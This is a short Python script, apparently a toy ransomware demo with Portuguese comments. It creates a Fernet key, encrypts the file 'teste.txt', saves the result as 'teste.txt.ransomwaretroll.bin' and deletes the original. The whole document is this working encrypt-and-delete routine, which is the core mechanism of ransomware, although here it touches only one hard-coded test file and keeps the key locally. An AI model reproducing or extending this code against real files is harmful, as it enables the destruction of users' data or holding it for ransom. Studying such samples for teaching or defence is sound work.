from cryptography.fernet import Fernet
from generate_key import create_secret_key, find_key
from pathlib import Path
from sys import exit

authentic = Path("teste.txt")

if not authentic.exists(): exit()

create_secret_key()

# buscando a chave secreta.
fernet = Fernet(find_key())

# Lendo aequivo à ser encriptado.
with open("teste.txt", "rb") as file:
    authentic_file = file.read()

# Criptografando.
encrypted = fernet.encrypt(authentic_file)

# Salva o arquivo criptografado.
with open("teste.txt.ransomwaretroll.bin", "wb") as encrypted_file:
    encrypted_file.write(encrypted)

authentic.unlink()